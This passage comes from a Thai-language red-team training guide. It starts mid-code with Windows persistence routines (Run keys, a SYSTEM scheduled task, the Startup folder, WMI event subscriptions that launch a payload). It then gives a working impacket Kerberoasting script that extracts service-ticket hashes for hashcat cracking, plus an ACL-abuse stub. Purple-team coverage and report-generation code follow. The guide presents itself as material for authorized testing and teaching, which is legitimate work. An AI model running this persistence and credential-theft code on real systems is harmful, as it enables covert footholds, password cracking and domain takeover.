             'Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce'),
        ]
        
        for hive, subkey in keys:
            try:
                key = winreg.OpenKey(hive, subkey, 0, winreg.KEY_WRITE)
                winreg.SetValueEx(key, name, 0, winreg.REG_SZ, payload_path)
                winreg.CloseKey(key)
                print(f"[+] Run key added: {name}")
                break
            except PermissionError:
                continue
    
    def scheduled_task_persistence(self, task_name, payload_path):
        """สร้าง Scheduled Task"""
        import subprocess
        
        cmd = [
            'schtasks', '/create',
            '/tn', task_name,
            '/tr', payload_path,
            '/sc', 'ONLOGON',
            '/ru', 'SYSTEM',
            '/f'
        ]
        
        result = subprocess.run(cmd, capture_output=True)
        if result.returncode == 0:
            print(f"[+] Scheduled task created: {task_name}")
    
    def startup_folder_persistence(self, payload_path, name):
        """Copy ไปยัง Startup folder"""
        startup_dirs = [
            os.path.expandvars('%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'),
            'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'
        ]
        
        for startup_dir in startup_dirs:
            if os.path.exists(startup_dir):
                dest = os.path.join(startup_dir, name)
                try:
                    shutil.copy(payload_path, dest)
                    print(f"[+] Payload copied to startup: {dest}")
                    break
                except PermissionError:
                    continue
    
    def wmi_subscription_persistence(self, payload_path):
        """WMI Event Subscription persistence"""
        import subprocess
        
        # Create event filter
        filter_cmd = """
wmic /NAMESPACE:"\\\\root\\subscription" PATH __EventFilter CREATE Name="PersistFilter", Language="WQL", EventNameSpace="root\\cimv2", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Seconds=0"
"""
        
        # Create consumer
        consumer_cmd = f"""
wmic /NAMESPACE:"\\\\root\\subscription" PATH CommandLineEventConsumer CREATE Name="PersistConsumer", CommandLineTemplate="{payload_path}"
"""
        
        # Create binding
        binding_cmd = """
wmic /NAMESPACE:"\\\\root\\subscription" PATH __FilterToConsumerBinding CREATE Filter='__EventFilter.Name="PersistFilter"', Consumer='CommandLineEventConsumer.Name="PersistConsumer"'
"""
        
        for cmd in [filter_cmd, consumer_cmd, binding_cmd]:
            subprocess.run(cmd, shell=True, capture_output=True)
        
        print("[+] WMI subscription persistence created")
    
    def check_persistence(self):
        """ตรวจสอบ persistence ที่ถูกสร้าง"""
        print("[*] Checking persistence mechanisms...")
        
        # Check Run keys
        run_keys = [
            (winreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'),
            (winreg.HKEY_LOCAL_MACHINE, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run')
        ]
        
        for hive, subkey in run_keys:
            try:
                key = winreg.OpenKey(hive, subkey)
                i = 0
                while True:
                    try:
                        name, data, _ = winreg.EnumValue(key, i)
                        print(f"  Run key: {name} = {data}")
                        i += 1
                    except WindowsError:
                        break
                winreg.CloseKey(key)
            except:
                pass
```

---

## ขั้นตอนที่ 188: Active Directory Advanced Attacks

### ACL Abuse

```python
#!/usr/bin/env python3
# ad_acl_abuse.py - Active Directory ACL Abuse

from impacket.ldap import ldap, ldaptypes
from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR
import struct

class ADACLAbuse:
    def __init__(self, dc_ip, domain, username, password):
        self.dc_ip = dc_ip
        self.domain = domain
        self.username = username
        self.password = password
        self.conn = None
    
    def connect(self):
        self.conn = ldap.LDAPConnection(f'ldap://{self.dc_ip}')
        self.conn.login(
            user=self.username,
            password=self.password,
            domain=self.domain
        )
    
    def get_object_acl(self, target_dn):
        """ดู ACL ของ object"""
        result = self.conn.search(
            searchBase=target_dn,
            searchFilter='(objectClass=*)',
            attributes=['nTSecurityDescriptor']
        )
        
        for entry in result:
            sd_bytes = entry['attributes']['nTSecurityDescriptor']
            sd = SR_SECURITY_DESCRIPTOR(data=sd_bytes)
            
            print(f"ACL for: {target_dn}")
            if sd['Dacl']:
                for ace in sd['Dacl']['Data']:
                    ace_type = ace['AceType']
                    mask = ace['Ace']['Mask']['Mask']
                    print(f"  ACE Type: {ace_type}, Mask: 0x{mask:08x}")
    
    def add_dcreplication_rights(self, user_dn, domain_dn):
        """เพิ่ม DCSync rights"""
        # DS-Replication-Get-Changes: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
        # DS-Replication-Get-Changes-All: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
        print(f"[*] Adding DCSync rights to {user_dn}...")
        # This would use DACL modification
    
    def owned_path_analysis(self):
        """ค้นหา ACL abuse paths (BloodHound-style)"""
        attack_paths = []
        
        # Rights ที่ dangerous
        dangerous_rights = {
            'GenericAll': 0xF01FF,
            'GenericWrite': 0x40000000,
            'WriteOwner': 0x80000,
            'WriteDacl': 0x40000,
            'AllExtendedRights': 0x00000100,
            'ForceChangePassword': 0x00010000
        }
        
        return attack_paths
```

### Kerberoasting Attack

```python
#!/usr/bin/env python3
# kerberoast.py - Kerberoasting attack

from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
from impacket.krb5.types import KerberosTime, Principal
from impacket.krb5 import constants
from impacket.krb5.asn1 import TGS_REP
from impacket import version
from datetime import datetime, timedelta
import binascii

def kerberoast_attack(domain, username, password, dc_ip):
    """ทำ Kerberoasting attack"""
    print(f"[*] Getting TGT for {username}@{domain}")
    
    # Get TGT
    userName = Principal(username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
        userName,
        password,
        domain,
        None, None, None,
        dc_ip
    )
    
    print("[+] TGT obtained")
    
    # Get list of SPNs from LDAP
    from impacket.ldap import ldap as ldap_module
    ldap_conn = ldap_module.LDAPConnection(f'ldap://{dc_ip}')
    ldap_conn.login(username, password, domain)
    
    spn_results = ldap_conn.search(
        searchFilter='(&(servicePrincipalName=*)(UserAccountControl:1.2.840.113556.1.4.803:=512)(!UserAccountControl:1.2.840.113556.1.4.803:=2))',
        attributes=['sAMAccountName', 'servicePrincipalName']
    )
    
    hashes = []
    for user in spn_results:
        username_target = user['attributes']['sAMAccountName']
        spns = user['attributes']['servicePrincipalName']
        
        if isinstance(spns, str):
            spns = [spns]
        
        for spn in spns[:1]:  # Request first SPN
            print(f"[*] Requesting TGS for: {spn}")
            
            try:
                serverName = Principal(
                    spn,
                    type=constants.PrincipalNameType.NT_SRV_INST.value
                )
                
                tgs, cipher, oldSessionKey2, sessionKey2 = getKerberosTGS(
                    serverName,
                    domain,
                    dc_ip,
                    tgt,
                    cipher,
                    sessionKey
                )
                
                # Extract hash for cracking
                tgs_rep = TGS_REP(tgs)
                enc_part = tgs_rep['ticket']['enc-part']
                
                hash_str = format_kerberoast_hash(
                    username_target,
                    domain,
                    spn,
                    enc_part
                )
                
                hashes.append(hash_str)
                print(f"[+] Hash for {username_target}: {hash_str[:50]}...")
            except Exception as e:
                print(f"[-] Error for {spn}: {e}")
    
    return hashes

def format_kerberoast_hash(username, domain, spn, enc_part):
    """Format hash สำหรับ hashcat"""
    etype = enc_part['etype']
    cipher_text = enc_part['cipher'].asOctets()
    
    if etype == 23:  # RC4
        hash_str = f"$krb5tgs$23$*{username}${domain}${spn}*"
        hash_str += binascii.hexlify(cipher_text[:16]).decode()
        hash_str += '$'
        hash_str += binascii.hexlify(cipher_text[16:]).decode()
    elif etype == 18:  # AES256
        hash_str = f"$krb5tgs$18$*{username}${domain}${spn}*"
        # ... AES format
    
    return hash_str

# Crack with hashcat
# hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
```

---

## ขั้นตอนที่ 189: Purple Team Operations

### Purple Team Framework

```
Purple Team = Red Team + Blue Team Collaboration

Objective: ปรับปรุง Detection และ Response capabilities

Workflow:
┌──────────────────────────────────────────────────────┐
│                                                      │
│  Red Team                    Blue Team               │
│  (Attackers)                 (Defenders)             │
│      |                           |                   │
│      |--- Execute Technique ---> |                   │
│      |                           | Detect? (Y/N)     │
│      |                           | Alert? (Y/N)      │
│      |                           | Respond? (Y/N)    │
│      |                           |                   │
│      |<---- Share Telemetry -----|                   │
│      |                           |                   │
│      |--- Next Technique ------> |                   │
│      |                           |                   │
│                                                      │
│         Joint Debrief                               │
│         Gap Analysis                                │
│         Detection Rule Development                  │
│         Remediation Planning                        │
└──────────────────────────────────────────────────────┘
```

### MITRE ATT&CK Coverage Assessment

```python
#!/usr/bin/env python3
# attck_coverage.py - ประเมิน MITRE ATT&CK Coverage

import json
import requests

# MITRE ATT&CK Enterprise Matrix (สรุป)
ATTCK_TACTICS = {
    'TA0001': {'name': 'Initial Access', 'techniques': 9},
    'TA0002': {'name': 'Execution', 'techniques': 14},
    'TA0003': {'name': 'Persistence', 'techniques': 19},
    'TA0004': {'name': 'Privilege Escalation', 'techniques': 13},
    'TA0005': {'name': 'Defense Evasion', 'techniques': 42},
    'TA0006': {'name': 'Credential Access', 'techniques': 17},
    'TA0007': {'name': 'Discovery', 'techniques': 31},
    'TA0008': {'name': 'Lateral Movement', 'techniques': 9},
    'TA0009': {'name': 'Collection', 'techniques': 17},
    'TA0010': {'name': 'Exfiltration', 'techniques': 9},
    'TA0011': {'name': 'Command and Control', 'techniques': 18},
    'TA0040': {'name': 'Impact', 'techniques': 14}
}

class ATTCKCoverageAssessor:
    def __init__(self):
        self.tested_techniques = {}
        self.detected_techniques = {}
    
    def record_test(self, technique_id, tactic_id, detected, notes=''):
        """บันทึกผลการทดสอบ technique"""
        self.tested_techniques[technique_id] = {
            'tactic': tactic_id,
            'detected': detected,
            'notes': notes,
            'timestamp': __import__('datetime').datetime.now().isoformat()
        }
        
        if detected:
            self.detected_techniques[technique_id] = True
    
    def calculate_coverage(self):
        """คำนวณ coverage ต่อ tactic"""
        coverage = {}
        
        for tactic_id, tactic_info in ATTCK_TACTICS.items():
            tactic_techniques = [
                t for t, info in self.tested_techniques.items()
                if info['tactic'] == tactic_id
            ]
            
            detected = sum(1 for t in tactic_techniques if self.tested_techniques[t]['detected'])
            tested = len(tactic_techniques)
            
            coverage[tactic_id] = {
                'name': tactic_info['name'],
                'tested': tested,
                'detected': detected,
                'detection_rate': f"{(detected/tested*100):.1f}%" if tested > 0 else 'N/A'
            }
        
        return coverage
    
    def generate_heatmap_data(self):
        """สร้างข้อมูลสำหรับ ATT&CK Navigator"""
        layers = []
        
        for tech_id, info in self.tested_techniques.items():
            layer_entry = {
                'techniqueID': tech_id,
                'score': 100 if info['detected'] else 0,
                'color': '#00ff00' if info['detected'] else '#ff0000',
                'comment': info['notes'],
                'enabled': True
            }
            layers.append(layer_entry)
        
        navigator_layer = {
            'name': 'Purple Team Coverage',
            'version': '4.3',
            'domain': 'enterprise-attack',
            'techniques': layers
        }
        
        return json.dumps(navigator_layer, indent=2)
    
    def print_summary(self):
        """แสดงสรุป coverage"""
        print("\n=== MITRE ATT&CK Coverage Summary ===")
        print(f"Total techniques tested: {len(self.tested_techniques)}")
        print(f"Total detected: {len(self.detected_techniques)}")
        
        if self.tested_techniques:
            detection_rate = len(self.detected_techniques) / len(self.tested_techniques) * 100
            print(f"Overall detection rate: {detection_rate:.1f}%")
        
        print("\nCoverage by Tactic:")
        coverage = self.calculate_coverage()
        for tid, data in coverage.items():
            if data['tested'] > 0:
                print(f"  {data['name']}: {data['detected']}/{data['tested']} ({data['detection_rate']})")

# Example usage
assessor = ATTCKCoverageAssessor()
assessor.record_test('T1055', 'TA0005', False, 'Process injection not detected by EDR')
assessor.record_test('T1003.001', 'TA0006', True, 'LSASS dump detected by Windows Defender')
assessor.record_test('T1021.001', 'TA0008', True, 'RDP lateral movement detected by SIEM')
assessor.record_test('T1071.001', 'TA0011', False, 'HTTP C2 traffic blends in with normal')
assessor.print_summary()
```

---

## ขั้นตอนที่ 190: Red Team Reporting

### Executive Report Template

```python
#!/usr/bin/env python3
# red_team_reporter.py - สร้าง Red Team Report

from datetime import datetime
import json

class RedTeamReporter:
    def __init__(self, engagement_data):
        self.data = engagement_data
    
    def generate_executive_summary(self):
        """สร้าง Executive Summary"""
        return f"""
# Red Team Engagement Executive Summary

**Client:** {self.data['client']}
**Engagement Period:** {self.data['start_date']} to {self.data['end_date']}
**Engagement Type:** {self.data['type']}

## Key Findings

{self.data['executive_summary']}

## Overall Risk Rating: {self.data['overall_risk']}

## Critical Findings:
{chr(10).join([f"- {f}" for f in self.data['critical_findings']])}

## Recommendations:
{chr(10).join([f"{i+1}. {r}" for i, r in enumerate(self.data['recommendations'])])}
"""
    
    def generate_technical_report(self):
        """สร้าง Technical Report"""
        report = "# Technical Findings\n\n"
        
        for i, finding in enumerate(self.data['technical_findings'], 1):
            report += f"""
## Finding {i}: {finding['title']}

**Severity:** {finding['severity']}
**CVSS Score:** {finding.get('cvss', 'N/A')}
**MITRE ATT&CK:** {', '.join(finding.get('mitre_techniques', []))}

### Description
{finding['description']}

### Evidence
```
{finding.get('evidence', 'See attached screenshots')}
```

### Impact
{finding['impact']}

### Remediation
{finding['remediation']}

---
"""
        return report
    
    def calculate_risk_score(self, findings):
        """คำนวณ Risk Score"""
        severity_weights = {
            'Critical': 10,
            'High': 7,
            'Medium': 4,
            'Low': 1,
            'Info': 0
        }
        
        total_score = sum(severity_weights.get(f['severity'], 0) for f in findings)
        max_score = len(findings) * 10
        
        if max_score == 0:
            return 0
        
        return (total_score / max_score) * 100
    
    def generate_attack_timeline(self):
        """สร้าง Attack Timeline"""
        timeline = "# Attack Timeline\n\n"
        timeline += "| Date/Time | Phase | Action | Result |\n"
        timeline += "|-----------|-------|--------|--------|\n"
        
        for event in self.data.get('timeline', []):
            timeline += f"| {event['timestamp']} | {event['phase']} | {event['action']} | {event['result']} |\n"
        
        return timeline
    
    def export_report(self, output_path):
        """Export complete report"""
        full_report = ""
        full_report += self.generate_executive_summary()
        full_report += "\n\n"
        full_report += self.generate_attack_timeline()
        full_report += "\n\n"
        full_report += self.generate_technical_report()
        
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(full_report)
        
        print(f"[+] Report exported to {output_path}")
        return output_path

# Example usage
engagement = {
    'client': 'Example Corporation',
    'start_date': '2024-01-15',
    'end_date': '2024-01-31',
    'type': 'Full Red Team Assessment',
    'overall_risk': 'HIGH',
    'executive_summary': '''
    ทีม Red Team สามารถเจาะระบบเครือข่ายได้สำเร็จผ่านทาง Phishing Email 
    และสามารถ Escalate privileges จนได้ Domain Admin ใน 72 ชั่วโมง
    พบช่องโหว่ที่สำคัญหลายจุดที่ต้องแก้ไขโดยด่วน
    ''',
    'critical_findings': [
        'Domain Admin compromise via Kerberoasting',
        'Sensitive data exfiltration (10GB customer data)',
        'Lateral movement across 15 systems undetected'
    ],
    'recommendations': [
        'ติดตั้ง EDR solution บนระบบทั้งหมด',
        'เปิดใช้งาน MFA สำหรับ VPN และ Remote Access',
        'ฝึกอบรม Security Awareness ให้พนักงาน',
        'Review และ update SIEM detection rules',
        'Implement Privileged Access Workstations (PAW)'
    ],
    'technical_findings': [
        {
            'title': 'Kerberoasting - Weak Service Account Password',
            'severity': 'Critical',
            'cvss': '9.8',
            'mitre_techniques': ['T1558.003'],
            'description': 'พบ Service accounts ที่ใช้ weak password และ crackable ได้ใน 2 ชั่วโมง',
            'evidence': 'hashcat -m 13100 kerberoast.hash wordlist.txt\nStatus: Cracked in 1h 47m',
            'impact': 'Attacker ได้ Domain Admin privileges',
            'remediation': 'เปลี่ยน password ของ service accounts เป็น random 25+ characters และ enable LAPS'
        }
    ],
    'timeline': [
        {
            'timestamp': '2024-01-15 09:00',
            'phase': 'Reconnaissance',
            'action': 'OSINT gathering',
            'result': 'Found 150+ employee emails'
        },
        {
            'timestamp': '2024-01-16 14:23',
            'phase': 'Initial Access',
            'action': 'Spear phishing email sent',
            'result': '12/50 users clicked, 3 credentials captured'
        },
        {
            'timestamp': '2024-01-18 10:15',
            'phase': 'Privilege Escalation',
            'action': 'Kerberoasting attack',
            'result': 'Domain Admin hash cracked'
        }
    ]
}

reporter = RedTeamReporter(engagement)
print(reporter.generate_executive_summary())
```

---

## สรุปส่วนที่ 19

ในส่วนนี้เราได้เรียนรู้:

1. **Red Team Planning** - ROE, Infrastructure Planning, Redirectors
2. **C2 Frameworks** - Cobalt Strike, Malleable C2, Custom C2
3. **Lateral Movement** - PtH, PtT, WMI, PowerShell, DCOM, SCM
4. **Credential Harvesting** - Mimikatz, LSASS dump, Browser passwords
5. **Defense Evasion** - AMSI bypass, ETW patch, AppLocker bypass, Obfuscation
6. **Data Exfiltration** - DNS, HTTPS, Steganography
7. **Persistence** - COM hijacking, Run keys, WMI subscriptions
8. **AD Advanced** - ACL abuse, Kerberoasting
9. **Purple Team** - ATT&CK coverage, Detection assessment
10. **Reporting** - Executive summary, Technical report, Timeline

> **หมายเหตุ**: เนื้อหาทั้งหมดนี้มีไว้เพื่อการศึกษาและการทดสอบในระบบที่ได้รับอนุญาตเท่านั้น
